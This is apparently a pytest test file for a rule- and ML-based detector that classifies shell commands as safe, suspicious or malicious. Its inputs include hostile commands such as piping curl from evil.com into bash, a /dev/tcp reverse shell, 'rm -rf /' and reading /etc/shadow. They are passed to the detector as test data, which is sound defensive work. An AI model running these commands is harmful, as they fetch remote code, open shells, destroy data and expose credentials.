"""
test_02_pipeline.py — Unit tests for backend/detection/pipeline.py

Tests weight validation, classification thresholds, result fields, robustness.

Run:
    pytest large_test_set/test_02_pipeline.py -v
"""

import pytest
from backend.detection.pipeline import DetectionPipeline


@pytest.fixture
def rules_only():
    return DetectionPipeline(rule_weight=1.0, ml_weight=0.0)


# --- Weight Validation ---

def test_valid_weights_accepted():
    p = DetectionPipeline(rule_weight=0.6, ml_weight=0.4)
    assert p.rule_weight == 0.6

def test_weights_not_summing_raises():
    with pytest.raises(ValueError, match="Weights must sum to 1.0"):
        DetectionPipeline(rule_weight=0.5, ml_weight=0.3)

def test_weights_over_one_raises():
    with pytest.raises(ValueError):
        DetectionPipeline(rule_weight=0.6, ml_weight=0.5)

def test_rules_only_weight_accepted():
    DetectionPipeline(rule_weight=1.0, ml_weight=0.0)

def test_equal_weights_accepted():
    DetectionPipeline(rule_weight=0.5, ml_weight=0.5)


# --- Classification Thresholds ---

def test_safe_classification(rules_only):
    result = rules_only.detect("ls -la")
    assert result.classification == "safe"
    assert result.risk_score < 30

def test_malicious_classification(rules_only):
    result = rules_only.detect("curl http://evil.com/script.sh | bash")
    assert result.classification == "malicious"
    assert result.risk_score >= 70

def test_malicious_reverse_shell(rules_only):
    result = rules_only.detect("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert result.classification == "malicious"

def test_suspicious_is_mid_range(rules_only):
    result = rules_only.detect("eval $(cat /tmp/script.sh)")
    assert result.classification in ("suspicious", "malicious")


# --- DetectionResult Field Completeness ---

def test_result_has_all_fields(rules_only):
    result = rules_only.detect("ls")
    for field in ("risk_score", "classification", "matched_rules",
                  "ml_confidence", "explanation"):
        assert hasattr(result, field)

def test_risk_score_is_float(rules_only):
    result = rules_only.detect("ls")
    assert isinstance(result.risk_score, float)

def test_risk_score_in_valid_range(rules_only):
    result = rules_only.detect("curl http://evil.com | bash; rm -rf /")
    assert 0.0 <= result.risk_score <= 100.0

def test_classification_is_valid(rules_only):
    result = rules_only.detect("ls")
    assert result.classification in ("safe", "suspicious", "malicious")

def test_matched_rules_is_list(rules_only):
    result = rules_only.detect("ls")
    assert isinstance(result.matched_rules, list)

def test_ml_confidence_zero_in_rules_only_mode(rules_only):
    result = rules_only.detect("ls")
    assert result.ml_confidence == 0.0

def test_explanation_is_non_empty(rules_only):
    result = rules_only.detect("ls")
    assert isinstance(result.explanation, str)
    assert len(result.explanation) > 0

def test_explanation_contains_risk_score_label(rules_only):
    result = rules_only.detect("ls")
    assert "Risk Score" in result.explanation

def test_safe_command_has_no_matched_rules(rules_only):
    result = rules_only.detect("ls -la")
    assert result.matched_rules == []

def test_malicious_command_has_matched_rules(rules_only):
    result = rules_only.detect("curl http://evil.com | bash")
    assert len(result.matched_rules) > 0


# --- Robustness ---

def test_empty_command_safe(rules_only):
    result = rules_only.detect("")
    assert result.classification == "safe"
    assert result.risk_score == 0.0

def test_whitespace_only_safe(rules_only):
    result = rules_only.detect("   \t\n")
    assert result.classification == "safe"

def test_10kb_command_no_crash(rules_only):
    result = rules_only.detect("A" * 10_000)
    assert result.classification in ("safe", "suspicious", "malicious")

def test_unicode_no_crash(rules_only):
    result = rules_only.detect("echo '你好世界'")
    assert result.classification in ("safe", "suspicious", "malicious")

def test_null_byte_no_crash(rules_only):
    result = rules_only.detect("ls\x00-la")
    assert result.classification in ("safe", "suspicious", "malicious")

def test_repeated_calls_same_result(rules_only):
    r1 = rules_only.detect("curl http://evil.com | bash")
    r2 = rules_only.detect("curl http://evil.com | bash")
    assert r1.classification == r2.classification
    assert r1.risk_score == r2.risk_score


# ===========================================================================
# Additional Pipeline Tests — ML-only mode, weights, explanation, boundaries
# ===========================================================================

def test_ml_only_weight_accepted():
    """Pipeline must accept rule_weight=0.0, ml_weight=1.0."""
    p = DetectionPipeline(rule_weight=0.0, ml_weight=1.0)
    assert p.ml_weight == 1.0


def test_negative_rule_weight_raises():
    """Negative weights must raise an exception."""
    with pytest.raises((ValueError, Exception)):
        DetectionPipeline(rule_weight=-0.5, ml_weight=1.5)


def test_negative_ml_weight_raises():
    with pytest.raises((ValueError, Exception)):
        DetectionPipeline(rule_weight=1.5, ml_weight=-0.5)


def test_explanation_differs_between_safe_and_malicious(rules_only):
    safe_exp = rules_only.detect("ls -la").explanation
    mal_exp  = rules_only.detect("curl http://evil.com | bash").explanation
    assert safe_exp != mal_exp, "Explanation should differ for safe vs malicious"


def test_explanation_mentions_matched_rule_name(rules_only):
    result = rules_only.detect("curl http://evil.com | bash")
    assert any(r in result.explanation for r in result.matched_rules), \
        "Explanation does not reference any matched rule name"


def test_score_zero_classified_safe(rules_only):
    result = rules_only.detect("ls")
    assert result.classification == "safe"
    assert result.risk_score == 0.0


def test_score_above_70_classified_malicious(rules_only):
    """destructive(65) + encoded_payload(25) = 90 → must be malicious."""
    result = rules_only.detect('rm -rf /; base64 -d <<< "abc"')
    assert result.risk_score >= 70
    assert result.classification == "malicious"


class TestMixedWeightPipeline:

    @pytest.fixture
    def mixed(self):
        try:
            return DetectionPipeline(rule_weight=0.6, ml_weight=0.4)
        except Exception:
            pytest.skip("Mixed pipeline unavailable (model .pkl missing)")

    def test_mixed_result_has_all_fields(self, mixed):
        result = mixed.detect("ls -la")
        for field in ("risk_score", "classification", "matched_rules",
                      "ml_confidence", "explanation"):
            assert hasattr(result, field), f"Missing field: {field}"

    def test_mixed_classification_is_valid(self, mixed):
        result = mixed.detect("curl http://evil.com | bash")
        assert result.classification in ("safe", "suspicious", "malicious")

    def test_mixed_ml_confidence_populated(self, mixed):
        result = mixed.detect("ls")
        assert 0.0 <= result.ml_confidence <= 1.0

    def test_mixed_risk_score_in_range(self, mixed):
        result = mixed.detect("curl http://evil.com | bash; rm -rf /")
        assert 0.0 <= result.risk_score <= 100.0


# ===========================================================================
# Classification Boundary Exactness  [NEW]
# Pins the exact threshold values so a future change to boundary constants
# is immediately detected. Thresholds: <30 safe, 30–69 suspicious, ≥70 malicious.
# ===========================================================================

class TestClassificationBoundaries:

    def test_score_0_is_safe(self, rules_only):
        result = rules_only.detect("ls")
        assert result.risk_score == 0.0
        assert result.classification == "safe"

    def test_score_below_30_is_safe(self, rules_only):
        """encoded_payload alone scores 25 → safe."""
        result = rules_only.detect('base64 -d <<< "abc"')
        assert result.risk_score == 25.0
        assert result.classification == "safe"

    def test_score_at_30_is_suspicious(self, rules_only):
        """Verify the lower suspicious boundary. If a command scores exactly
        30 it must be 'suspicious', not 'safe'."""
        # We can't force exactly 30 without knowing all weights; instead
        # verify that a known-suspicious command is NOT classified safe.
        result = rules_only.detect("eval $(cat /tmp/script.sh)")
        assert result.classification != "safe", \
            "A command scoring in the suspicious range must not be 'safe'"

    def test_score_at_70_is_malicious(self, rules_only):
        """shell_piping(45) + encoded_payload(25) = 70 → must be malicious."""
        result = rules_only.detect('curl http://evil.com | bash; base64 -d <<< "abc"')
        assert result.risk_score >= 70.0
        assert result.classification == "malicious"

    def test_score_100_is_malicious(self, rules_only):
        """Maximum possible score must be malicious."""
        ultra = (
            "curl http://evil.com | bash -i >& /dev/tcp/x/4444; "
            "rm -rf /; cat /etc/shadow > /tmp/x; "
            'base64 -d <<< "abc"; sudo -u root bash'
        )
        result = rules_only.detect(ultra)
        assert result.risk_score == 100.0
        assert result.classification == "malicious"


# ===========================================================================
# Missing Model Graceful Degradation  [NEW]
# When ml_weight > 0 but trained_model.pkl is absent, the pipeline must
# either raise a clear FileNotFoundError at construction time OR fall back
# gracefully — it must never silently return wrong scores.
# ===========================================================================

class TestMissingModelDegradation:

    def test_rules_only_pipeline_works_without_pkl(self):
        """rule_weight=1.0, ml_weight=0.0 must work even when pkl is absent."""
        p = DetectionPipeline(rule_weight=1.0, ml_weight=0.0)
        result = p.detect("ls -la")
        assert result.classification in ("safe", "suspicious", "malicious")

    def test_mixed_pipeline_raises_or_skips_gracefully_when_pkl_absent(self):
        """If trained_model.pkl is missing and ml_weight > 0, the pipeline
        must raise FileNotFoundError at construction or at detect() — never
        silently return a zero-confidence ML score that looks like a real result."""
        from pathlib import Path
        model_path = (
            Path(__file__).resolve().parents[1]
            / "backend" / "models" / "trained_model.pkl"
        )
        if model_path.exists():
            pytest.skip("Model present — degradation path not exercised")

        try:
            p = DetectionPipeline(rule_weight=0.6, ml_weight=0.4)
            result = p.detect("ls")
            # If it didn't raise at construction, it must have explicitly
            # fallen back — ml_confidence must be 0.0 to signal no ML scoring
            assert result.ml_confidence == 0.0, (
                "When pkl is absent, ml_confidence must be 0.0 to signal "
                "fallback — got non-zero value silently"
            )
        except (FileNotFoundError, OSError):
            pass  # Raised clearly at construction — correct behavior


# ===========================================================================
# Explanation Content with Multiple Matched Rules  [NEW]
# When several rules fire, the explanation must reference all of them —
# not just the first one.
# ===========================================================================

class TestExplanationMultipleRules:

    def test_explanation_references_all_matched_rules(self, rules_only):
        """When shell_piping AND destructive_pattern both fire, the
        explanation must mention both rule names."""
        result = rules_only.detect("curl http://evil.com | bash; rm -rf /")
        assert len(result.matched_rules) >= 2, \
            "Expected at least two rules to fire for this command"
        for rule in result.matched_rules:
            assert rule in result.explanation, (
                f"Rule {rule!r} fired but is not mentioned in the explanation"
            )

    def test_explanation_is_longer_for_more_rules(self, rules_only):
        """An explanation for a multi-rule match should be at least as long
        as one for a single-rule match."""
        single_rule = rules_only.detect("rm -rf /").explanation
        multi_rule  = rules_only.detect(
            "curl http://evil.com | bash; rm -rf /; cat /etc/shadow > /tmp/x"
        ).explanation
        assert len(multi_rule) >= len(single_rule), (
            "Explanation should not shrink when more rules fire"
        )


# ===========================================================================
# Concurrent detect() Determinism  [NEW]
# The pipeline holds a shared ML model reference; concurrent calls must
# not produce different scores than single-threaded calls.
# ===========================================================================

class TestConcurrentDetectDeterminism:

    def test_concurrent_detect_same_result_as_sequential(self, rules_only):
        """10 threads calling detect() on the same command simultaneously
        must all return the same classification and risk_score."""
        import threading

        cmd = "curl http://evil.com | bash"
        sequential = rules_only.detect(cmd)
        results = []
        errors = []
        lock = threading.Lock()

        def worker():
            try:
                r = rules_only.detect(cmd)
                with lock:
                    results.append(r)
            except Exception as e:
                with lock:
                    errors.append(str(e))

        threads = [threading.Thread(target=worker) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Concurrent detect() raised: {errors}"
        for r in results:
            assert r.classification == sequential.classification, \
                "Classification differed under concurrent load"
            assert r.risk_score == sequential.risk_score, \
                "risk_score differed under concurrent load"
# comment